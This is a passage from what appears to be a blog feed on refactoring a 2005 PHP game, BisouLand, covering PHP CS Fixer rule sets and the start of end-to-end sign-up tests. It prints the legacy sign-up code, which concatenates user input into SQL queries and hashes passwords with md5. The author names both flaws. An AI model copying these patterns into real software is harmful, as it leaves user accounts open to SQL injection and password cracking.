        // 1) ../monolith/web/phpincludes/bisous.php
        // 2) ../monolith/web/phpincludes/cerveau.php
        'statement_indentation' =&gt; false,

        // [PER-CS2.0] Partially disabled due to PHP version constraints.
        'trailing_comma_in_multiline' =&gt; [
            'after_heredoc' =&gt; true,
            'elements' =&gt; [
                // 'arguments', For PHP 7.3+
                // 'array_destructuring', For PHP 7.1+
                'arrays',
                // 'match', For PHP 8.0+
                // 'parameters', For PHP 8.0+
            ],
        ],
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>If we run the checks:</p>

<pre><code class="console">&gt; make cs-check
PHP CS Fixer 3.88.2 Folding Bike by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Running analysis on 15 cores with 10 files per process.
Parallel runner is an experimental feature and may be unstable, use it at your own risk. Feedback highly appreciated!
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%

   1) ../monolith/web/calcul.php (concat_space, binary_operator_spaces)
   2) ../monolith/web/redirect.php (blank_line_after_opening_tag, concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
   3) ../monolith/web/checkConnect.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
   4) ../monolith/web/phpincludes/fctIndex.php (array_syntax, array_indentation, blank_line_after_opening_tag, concat_space, trailing_comma_in_multiline, binary_operator_spaces,no_whitespace_in_blank_line)
   5) ../monolith/web/phpincludes/topten.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
   6) ../monolith/web/phpincludes/pages.php (array_syntax, blank_line_after_opening_tag, trailing_comma_in_multiline)
   7) ../monolith/web/deconnexion.php (blank_line_after_opening_tag, concat_space, binary_operator_spaces)
   8) ../monolith/web/news/rediger_news.php (no_whitespace_in_blank_line)
   9) ../monolith/web/news/chemin.php (blank_line_after_opening_tag)
  10) ../monolith/web/news/liste_news.php (concat_space)
  11) ../monolith/web/phpincludes/evo.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  12) ../monolith/web/phpincludes/stats.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  13) ../monolith/web/phpincludes/infos.php (array_syntax, concat_space, trailing_comma_in_multiline, binary_operator_spaces)
  14) ../monolith/web/phpincludes/cerveau.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  15) ../monolith/web/phpincludes/yeux.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  16) ../monolith/web/phpincludes/inscription.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  17) ../monolith/web/phpincludes/faq.php (array_syntax, concat_space, trailing_comma_in_multiline, binary_operator_spaces, no_whitespace_in_blank_line)
  18) ../monolith/web/phpincludes/construction.php (concat_space, binary_operator_spaces)
  19) ../monolith/web/phpincludes/recherche.php (concat_space, binary_operator_spaces)
  20) ../monolith/web/phpincludes/bd.php (concat_space)
  21) ../monolith/web/makeBan.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  22) ../monolith/web/index.php (array_syntax, concat_space, trailing_comma_in_multiline, binary_operator_spaces, no_whitespace_in_blank_line)
  23) ../monolith/web/phpincludes/livreor.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  24) ../monolith/web/phpincludes/bisous.php (array_syntax, concat_space, trailing_comma_in_multiline, binary_operator_spaces, no_whitespace_in_blank_line)
  25) ../monolith/web/phpincludes/boite.php (indentation_type, concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  26) ../monolith/web/phpincludes/connected.php (indentation_type, concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  27) ../monolith/web/phpincludes/envoi.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  28) ../monolith/web/phpincludes/action.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  29) ../monolith/web/phpincludes/accueil.php (array_syntax, array_indentation, binary_operator_spaces, no_whitespace_in_blank_line)
  30) ../monolith/web/phpincludes/lire.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  31) ../monolith/web/phpincludes/membres.php (concat_space, binary_operator_spaces)
  32) ../monolith/web/phpincludes/nuage.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  33) ../monolith/web/phpincludes/attaque.php (blank_line_after_opening_tag, concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  34) ../monolith/web/phpincludes/confirmation.php (array_syntax, concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  35) ../monolith/web/phpincludes/changepass.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)
  36) ../monolith/web/phpincludes/techno.php (concat_space, binary_operator_spaces)
  37) ../monolith/web/phpincludes/newpass.php (concat_space, binary_operator_spaces, no_whitespace_in_blank_line)

Found 37 of 43 files that can be fixed in 0.210 seconds, 16.00 MB memory used
</code></pre>

<p>Once again, no issues there, so we can apply the fixes: <code>make-cs fix</code>.</p>

<h2 id="level-5%3A-symfony">Level 5: Symfony</h2>

<p>Time for the final boss, the Coding Standards used in the Symfony project.</p>

<p>See <a href="https://cs.symfony.com/doc/ruleSets/Symfony.html">Symfony ruleset here</a>,
and <a href="https://cs.symfony.com/doc/ruleSets/SymfonyRisky.html">Symfony:risky ruleset there</a>.</p>

<p>Those are by no means meant to be used in Symfony projects (or any projects),
it's just what the Symfony developers use internally to build the framework.</p>

<p>But these 41 rules provide:</p>

<ul>
<li>Stricter PHPDoc requirements</li>
<li>Import (<code>use</code> statements) organisation and formatting</li>
<li>More opinionated whitespace and formatting rules</li>
<li>Type handling - Specific rules about how types are ordered and formatted</li>
</ul>

<p>The 34 risky rules also add performance optimisations
(e.g. native function invocation with leading backslash to by pass autoloading lookup).</p>

<p>So let's adopt them here:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        '@Symfony' =&gt; true,
        '@Symfony:risky' =&gt; true,

        // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

        // [PSR2] Disabled as the fixes break the following files:
        // 1) ../monolith/web/phpincludes/bisous.php
        // 2) ../monolith/web/phpincludes/cerveau.php
        'statement_indentation' =&gt; false,

        // [PER-CS2.0] Partially disabled due to PHP version constraints.
        'trailing_comma_in_multiline' =&gt; [
            'after_heredoc' =&gt; true,
            'elements' =&gt; [
                // 'arguments', For PHP 7.3+
                // 'array_destructuring', For PHP 7.1+
                'arrays',
                // 'match', For PHP 8.0+
                // 'parameters', For PHP 8.0+
            ],
        ],
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>Let's run the checks:</p>

<pre><code class="console">&gt; make cs-check
PHP CS Fixer 3.88.2 Folding Bike by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Running analysis on 15 cores with 10 files per process.
Parallel runner is an experimental feature and may be unstable, use it at your own risk. Feedback highly appreciated!
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%

   1) ../monolith/web/calcul.php (concat_space, no_extra_blank_lines)
   2) ../monolith/web/redirect.php (single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines)
   3) ../monolith/web/checkConnect.php (increment_style, single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines)
   4) ../monolith/web/phpincludes/fctIndex.php (single_space_around_construct, no_unneeded_control_parentheses, single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines, blank_line_before_statement)
   5) ../monolith/web/phpincludes/topten.php (single_space_around_construct, no_unneeded_control_parentheses, increment_style, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
   6) ../monolith/web/phpincludes/pages.php (single_quote, single_line_comment_spacing)
   7) ../monolith/web/deconnexion.php (single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines)
   8) ../monolith/web/news/rediger_news.php (concat_space, no_extra_blank_lines)
   9) ../monolith/web/news/chemin.php (blank_line_after_opening_tag)
  10) ../monolith/web/news/liste_news.php (single_line_comment_spacing, concat_space, yoda_style, logical_operators, no_extra_blank_lines)
  11) ../monolith/web/reductionNuages.php (single_line_comment_spacing)
  12) ../monolith/web/phpincludes/evo.php (increment_style, single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines, blank_line_before_statement)
  13) ../monolith/web/phpincludes/stats.php (single_space_around_construct, single_quote, semicolon_after_instruction, concat_space, space_after_semicolon)
  14) ../monolith/web/phpincludes/infos.php (increment_style, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon)
  15) ../monolith/web/phpincludes/cerveau.php (single_space_around_construct, no_unneeded_control_parentheses, single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  16) ../monolith/web/phpincludes/yeux.php (no_unneeded_control_parentheses, single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  17) ../monolith/web/phpincludes/inscription.php (single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  18) ../monolith/web/phpincludes/faq.php (single_quote, single_line_comment_spacing, concat_space, no_extra_blank_lines)
  19) ../monolith/web/phpincludes/construction.php (single_space_around_construct, no_unneeded_control_parentheses, increment_style, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  20) ../monolith/web/phpincludes/recherche.php (single_quote, concat_space, yoda_style)
  21) ../monolith/web/phpincludes/bd.php (concat_space)
  22) ../monolith/web/phpincludes/accueil.php (single_quote, whitespace_after_comma_in_array, yoda_style, space_after_semicolon, no_extra_blank_lines)
  23) ../monolith/web/phpincludes/lire.php (single_space_around_construct, single_quote, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  24) ../monolith/web/phpincludes/membres.php (modernize_types_casting, no_unneeded_control_parentheses, increment_style, single_quote, concat_space, no_singleline_whitespace_before_semicolons, yoda_style, no_extra_blank_lines, binary_operator_spaces)
  25) ../monolith/web/phpincludes/nuage.php (single_space_around_construct, increment_style, single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  26) ../monolith/web/phpincludes/attaque.php (no_empty_statement, no_unneeded_control_parentheses, single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines)
  27) ../monolith/web/phpincludes/confirmation.php (no_unneeded_control_parentheses, increment_style, single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  28) ../monolith/web/phpincludes/changepass.php (single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon)
  29) ../monolith/web/phpincludes/techno.php (single_space_around_construct, no_unneeded_control_parentheses, increment_style, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  30) ../monolith/web/phpincludes/newpass.php (single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  31) ../monolith/web/makeBan.php (increment_style, single_quote, single_line_comment_spacing, concat_space, space_after_semicolon)
  32) ../monolith/web/index.php (single_space_around_construct, increment_style, single_quote, no_spaces_after_function_name, single_line_comment_spacing, concat_space, include,no_singleline_whitespace_before_semicolons, yoda_style, space_after_semicolon, no_extra_blank_lines)
  33) ../monolith/web/phpincludes/livreor.php (modernize_types_casting, no_unneeded_control_parentheses, increment_style, single_quote, semicolon_after_instruction, single_line_comment_spacing, native_constant_invocation, concat_space, no_singleline_whitespace_before_semicolons, yoda_style, no_extra_blank_lines, binary_operator_spaces)
  34) ../monolith/web/phpincludes/bisous.php (single_space_around_construct, no_unneeded_control_parentheses, increment_style, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  35) ../monolith/web/phpincludes/connexion.php (yoda_style, no_extra_blank_lines)
  36) ../monolith/web/phpincludes/boite.php (indentation_type, single_space_around_construct, increment_style, single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  37) ../monolith/web/phpincludes/connected.php (indentation_type, single_quote, single_line_comment_spacing, concat_space, yoda_style, no_extra_blank_lines)
  38) ../monolith/web/phpincludes/envoi.php (single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines)
  39) ../monolith/web/phpincludes/action.php (no_unneeded_braces, single_quote, single_line_comment_spacing, concat_space, yoda_style, space_after_semicolon, no_extra_blank_lines, no_whitespace_in_blank_line)

Found 39 of 43 files that can be fixed in 0.212 seconds, 16.00 MB memory used
</code></pre>

<p>All safe it'd seem, let's apply those then: <code>make cs-fix</code></p>

<h2 id="conclusion">Conclusion</h2>

<p>By progressively applying PHP CS Fixer rule sets,
we've transformed BisouLand's chaotic 2005 code into something that follows modern standards.</p>

<p>The key insight here is <strong>incrementalism</strong>,
we didn't jump straight to the strictest rule set,
but instead built up gradually:</p>

<ol>
<li>PSR-1: Basic formatting (opening tags, encoding)</li>
<li>PSR-2: Braces and indentation</li>
<li>PSR-12: Modern PHP syntax support</li>
<li>PER-CS 2.0: PHP 8 features (adjusted for PHP 5.6 compatibility)</li>
<li>Symfony: Stricter PHPDoc, imports, and performance optimisations</li>
</ol>

<p>Along the way we:</p>

<ul>
<li><strong>Identified problematic rules</strong> (<code>statement_indentation</code> breaks mixed HTML/PHP files)</li>
<li><strong>Adapted for PHP version constraints</strong> (trailing commas only for arrays in PHP 5.6)</li>
<li><strong>Applied changes incrementally</strong> (check, fix, test, repeat)</li>
</ul>

<p>The final configuration gives us automated formatting that makes the code more
readable and maintainable, without breaking functionality.</p>

<p>Now, before we move on, here's a super secret PHP CS Fixer tip:
you can run <code>php-cs-fixer describe &lt;rule/ruleset&gt;</code>,
which serves as a local documentation:</p>

<pre><code class="console">&gt; docker compose exec app php vendor/bin/php-cs-fixer describe trailing_comma_in_multiline
PHP CS Fixer 3.88.2 Folding Bike by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Description of the `trailing_comma_in_multiline` rule.

Arguments lists, array destructuring lists, arrays that are multi-line, `match`-lines and parameters lists must have a trailing comma.

Fixer is configurable using following options:
* after_heredoc (bool): whether a trailing comma should also be placed after heredoc end; defaults to false
* elements (a subset of ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']): where to fix multiline trailing comma (PHP &gt;= 8.0 for `parameters` and `match`); defaults to ['arrays']

Fixing examples:
 * Example #1. Fixing with the default configuration.
   ---------- begin diff ----------
   --- Original
   +++ New
   @@ -1,5 +1,5 @@
    &lt;?php
    array(
        1,
   -    2
   +    2,
    );

   ----------- end diff -----------

 * Example #2. Fixing with configuration: ['after_heredoc' =&gt; true].
   ---------- begin diff ----------
   --- Original
   +++ New
   @@ -1,7 +1,7 @@
    &lt;?php
        $x = [
            'foo',
            &lt;&lt;&lt;EOD
                bar
   -            EOD
   +            EOD,
        ];

   ----------- end diff -----------

 * Example #3. Fixing with configuration: ['elements' =&gt; ['arguments']].
   ---------- begin diff ----------
   --- Original
   +++ New
   @@ -1,5 +1,5 @@
    &lt;?php
    foo(
        1,
   -    2
   +    2,
    );

   ----------- end diff -----------

 * Example #4. Fixing with configuration: ['elements' =&gt; ['parameters']].
   ---------- begin diff ----------
   --- Original
   +++ New
   @@ -1,7 +1,7 @@
    &lt;?php
    function foo(
        $x,
   -    $y
   +    $y,
    )
    {
    }

   ----------- end diff -----------

The fixer is part of the following rule sets:
* @PER *(deprecated)* with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']]
* @PER-CS with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']]
* @PER-CS2.0 *(deprecated)* with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']]
* @PER-CS2x0 with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']]
* @PER-CS3.0 *(deprecated)* with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']]
* @PER-CS3x0 with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['arguments', 'array_destructuring', 'arrays', 'match', 'parameters']]
* @PHP73Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP74Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP7x3Migration with config: ['after_heredoc' =&gt; true]
* @PHP7x4Migration with config: ['after_heredoc' =&gt; true]
* @PHP80Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP81Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP82Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP83Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP84Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP85Migration *(deprecated)* with config: ['after_heredoc' =&gt; true]
* @PHP8x0Migration with config: ['after_heredoc' =&gt; true]
* @PHP8x1Migration with config: ['after_heredoc' =&gt; true]
* @PHP8x2Migration with config: ['after_heredoc' =&gt; true]
* @PHP8x3Migration with config: ['after_heredoc' =&gt; true]
* @PHP8x4Migration with config: ['after_heredoc' =&gt; true]
* @PHP8x5Migration with config: ['after_heredoc' =&gt; true]
* @PhpCsFixer with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['array_destructuring', 'arrays']]
* @Symfony with config: ['after_heredoc' =&gt; true, 'elements' =&gt; ['array_destructuring', 'arrays', 'match', 'parameters']]
</code></pre>

<blockquote>
  <p>‚ÅâÔ∏è <em>Hold on, what about those <strong>SQL injection vulnerabilities</strong>?</em></p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 3: End to End Tests]]></title>
            <link href="/2025/09/24/xl-3-end-to-end-tests.html"/>
            <updated>2025-09-24T00:00:00+01:00</updated>
            <id>/2025/09/24/xl-3-end-to-end-tests.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò The Beta Destroyer breaks free from the crypts of Manual Testing,
  forging unbreakable chains of End to End test scenarios,
  binding every component in the unholy covenant of automations! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
</ol>

<p>This means we can run it locally (http://localhost:8080/),
and have some level of automated tests.</p>

<p>But currently the tests are failing!</p>

<p>So, we'll inspect the issue, identify it,
write End to End tests which will be today's third article focus,
and finally we'll fix the bug.</p>

<p><img
    alt="The plan: we find the bug. We fix the bug. Now there are two bugs. Now there are three bugs"
    src="/images/xl-3-the-plan.jpg"
    width="100%" /></p>

<ul>
<li><a href="#identifying-the-issue">Identifying the issue</a></li>
<li><a href="#writing-the-test">Writing the test</a></li>
<li><a href="#test-data-cleanup">Test data cleanup</a></li>
<li><a href="#custom-assertion">Custom Assertion</a></li>
<li><a href="#fixing-the-bug">Fixing the bug</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="identifying-the-issue">Identifying the issue</h2>

<p>Let's run the tests to see the failure messages:</p>

<pre><code class="console">make test arg='--testdox --filter PlayerPages'
PHPUnit 12.3.2 by Sebastian Bergmann and contributors.

Runtime:       PHP 8.4.12
Configuration: /apps/qa/phpunit.xml.dist

FFFFFFFFFFFF............                                          24 / 24 (100%)

Time: 00:00.081, Memory: 18.00 MB

Player Pages (Bl\Qa\Tests\Smoke\PlayerPages)
 ‚úò it loads account page (`/connected.html`) for logged in players
   ‚îê
   ‚îú Failed asserting that Page loads for logged in players
   ‚îÇ
   ‚îÇ /apps/qa/tests/Smoke/Assertion/Assert.php:41
   ‚îÇ /apps/qa/tests/Smoke/PlayerPagesTest.php:45
   ‚î¥
[...]
FAILURES!
Tests: 24, Assertions: 24, Failures: 12.
</code></pre>

<p>The player cannot log in... Let's try manually,
first we need to sign-up a new player:</p>

<p><img alt="BisouLand signup attempt screenshot" src="/images/xl-3-signup-attempt-screenshot.png" width="100%" /></p>

<p>It worked:</p>

<p><img alt="BisouLand signup errot screenshot" src="/images/xl-3-signup-success-screenshot.png" width="100%" /></p>

<p>Now let's log in:</p>

<p><img alt="BisouLand signup attempt screenshot" src="/images/xl-3-login-attempt-screenshot.png" width="100%" /></p>

<p>But it fails! The error says the username doesn't exist:</p>

<p><img alt="BisouLand signup errot screenshot" src="/images/xl-3-login-failure-screenshot.png" width="100%" /></p>

<p>Inspecting the database shows that the player data wasn't inserted.</p>

<p>The Smoke Tests didn't catch directly the login error,
because it's an error printed inside the HTML,
and our tests only check for status code <code>200</code>.</p>

<p>So this highlights the limits of Smoke Tests
(though we have to recognise that they did indirectly catch the issue,
with players being unable to login).</p>

<p>The code handling signing up is located in <code>./apps/monolith/web/phpincludes/inscription.php</code>,
and hold on to your socks because it looks like this:</p>

<pre><code class="php">&lt;?php
if (false == $_SESSION['logged']) {
    $send = 0;
    $pseudo = '';
    $mdp = '';
    if (isset($_POST['inscription'])) {
        // Mesure de securite.
        $pseudo = htmlentities(addslashes($_POST['Ipseudo']));
        $mdp = htmlentities(addslashes($_POST['Imdp']));
        $mdp2 = htmlentities(addslashes($_POST['Imdp2']));
        // Prevoir empecher de prendre un pseudo deje existant
        // Si les variables contenant le pseudo, le mot de passe existent et contiennent quelque chose.
        if (isset($_POST['Ipseudo'], $_POST['Imdp'], $_POST['Imdp2']) &amp;&amp; !empty($_POST['Ipseudo']) &amp;&amp; !empty($_POST['Imdp']) &amp;&amp; !empty($_POST['Imdp2'])) {
            if ($mdp == $mdp2) {
                // Si le pseudo est superieur e 3 caracteres et inferieur e 35 caracteres.
                $taille = strlen(trim($_POST['Ipseudo']));
                if ($taille &gt;= 4 &amp;&amp; $taille &lt;= 15) {
                    /* //Mesure de securite.
                    $pseudo = htmlentities(addslashes($_POST['pseudo']));
                    $mdp = htmlentities(addslashes($_POST['mdp']));*/

                    // La requete qui compte le nombre de pseudos
                    $sql = mysql_query("SELECT COUNT(*) AS nb_pseudo FROM membres WHERE pseudo='".$pseudo."'");

                    // Verifie si le pseudo n'est pas deje pris.
                    if (0 == mysql_result($sql, 0, 'nb_pseudo') &amp;&amp; 'BisouLand' != $pseudo) {
                        // Verifie que le pseudo est correct.
                        if (preg_match("!^\w+$!", $pseudo)) {
                            if (preg_match("!^\w+$!", $mdp)) {
                                // Si le mot de passe est superieur e 4 caracteres.
                                $taille = strlen(trim($_POST['Imdp']));
                                if ($taille &gt;= 5 &amp;&amp; $taille &lt;= 15) {
                                    // On execute la requete qui enregistre un nouveau membre.

                                    // Hashage du mot de passe avec md5().
                                    $hmdp = md5($mdp);

                                    mysql_query("INSERT INTO membres (id, pseudo, mdp, confirmation, lastconnect) VALUES ('', '".$pseudo."', '".$hmdp."', '1', ".time().')');

                                    echo 'Ton inscription est confirm√©e ! Tu peux maintenant te connecter.&lt;br /&gt;';
                                    $send = 1;
                                } else {
                                    echo 'Erreur : le mot de passe est soit trop court, soit trop long !';
                                }
                            } else {
                                echo 'Erreur : le mot de passe n\'est pas valide !';
                            }
                        } else {
                            echo 'Erreur : le pseudo n\'est pas valide !';
                        }
                    } else {
                        echo 'Erreur : pseudo deje pris !';
                    }
                } else {
                    echo 'Erreur : le pseudo est soit trop court, soit trop long !';
                }
            } else {
                echo 'Erreur : Tu n\'as pas rentre deux fois le meme mot de passe !';
            }
        } else {
            echo 'Erreur : Pense e remplir tous les champs !';
        }
    }
    if (0 == $send) {
        ?&gt;
&lt;form method="post" class="formul" action="inscription.html"&gt;
    &lt;label&gt;Pseudo :&lt;br /&gt;&lt;span class="petit"&gt;(Entre 4 et 15 caracteres)&lt;/span&gt;&lt;br /&gt;&lt;input type="text" name="Ipseudo" tabindex="10" size="15" maxlength="15" value="&lt;?php echo stripslashes($pseudo); ?&gt;"/&gt;&lt;/label&gt;&lt;br /&gt;
    &lt;label&gt;Mot de passe : &lt;br /&gt;&lt;span class="petit"&gt;(Entre 5 et 15 caracteres)&lt;/span&gt;&lt;br /&gt;&lt;input type="password" name="Imdp" tabindex="20" size="15" maxlength="15" value=""/&gt;&lt;/label&gt;&lt;br /&gt;
    &lt;label&gt;Reecris le mot de passe : &lt;br /&gt;&lt;input type="password" name="Imdp2" tabindex="30" size="15" maxlength="15" value=""/&gt;&lt;/label&gt;&lt;br /&gt;
    &lt;input type="submit" name="inscription" value="S'inscrire" /&gt;
&lt;/form&gt;
&lt;?php
    }
} else {
    echo 'Pfiou t\'es dja connected toi !!';
}
?&gt;
</code></pre>

<p>Now, that's eXtreme Legacy!!!</p>

<p>Let's focus on the problematic line,
which is supposed to save the player's data in the database
(I've reformatted it a bit for readability):</p>

<pre><code class="php">mysql_query(
    'INSERT INTO membres (id, pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
    ." VALUES ('', '{$pseudo}', '{$hmdp}', '1', ".time().', '.time().", '300')"
);
</code></pre>

<p>There are many problems here (deprecated function, SQL injection vulnerability,
use of cryptologically broken md5 for password hashing etc),
but what jumps to my attention is the use of <code>''</code> for the ID value.</p>

<p>After some research it turns out this code worked fine in older MySQL versions,
because MySQL would silently convert the empty string to <code>0</code>,
and since the id field is an <code>AUTO_INCREMENT</code> integer,
MySQL would then treat that <code>0</code> as a signal to generate the next sequence value.</p>

<p>However MySQL 5.7 (which is the version we picked!), released in October 2015,
introduced a significant change: <code>STRICT_TRANS_TABLES</code> became enabled by default.
This means MySQL now rejects data type error like this one.</p>

<p>So to fix the issue we can change the MySQL version,
but the end goal is to upgrade the versions to the most recent, not to downgrade,
so let's instead just fix the code.</p>

<p>But first, we need to write a test: Test Driven Development, or no tests at all! ü§ò</p>

<h2 id="writing-the-test">Writing the test</h2>

<p>There are two kinds of tests that I hate: Smoke Tests, and End to End Tests.</p>

<p>End to End tests usually are about navigating the application, which is slow,
and checking for the content of the response, which is brittle.</p>

<p>However in this scenario, there are no alternative to test the features:
there are no HTTP framework, or handler / controller / services classes used
to allow us to write Functional / Integration / System tests.</p>

<p>To test our sign-up, all we can do is:</p>

<ul>
<li>issue a POST request to simulate the form being submitted</li>
<li>check in the database if the expected record has been persisted</li>
</ul>

<p>So let's just do that:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\EndToEnd;

use Bl\Qa\Tests\EndToEnd\Assertion\Assert;
use Bl\Qa\Tests\Infrastructure\Scenario\SignUpNewPlayer;
use Bl\Qa\Tests\Infrastructure\TestKernelSingleton;
use PHPUnit\Framework\Attributes\CoversNothing;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Large;
use PHPUnit\Framework\Attributes\TestDox;
use PHPUnit\Framework\TestCase;

#[CoversNothing]
#[Large]
final class SignUpTest extends TestCase
{
    public function test_it_allows_visitors_to_become_players(): void
    {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        $player = SignUpNewPlayer::run(
            'BisouTest',
            'password',
            'password',
        );

        Assert::signedUpCount($player-&gt;username, 1);
    }

    #[DataProvider('invalidCredentialsProvider')]
    #[TestDox('It prevents invalid credentials: $description')]
    public function test_it_prevents_invalid_credentials(string $username, string $password, string $description): void
    {
        SignUpNewPlayer::run(
            $username,
            $password,
            $password,
        );

        Assert::signedUpCount($username, 0);
    }

    /**
     * [string $username, string $password, string $description][].
     *
     * @return array&lt;array{string, string, string}&gt;
     */
    public static function invalidCredentialsProvider(): array
    {
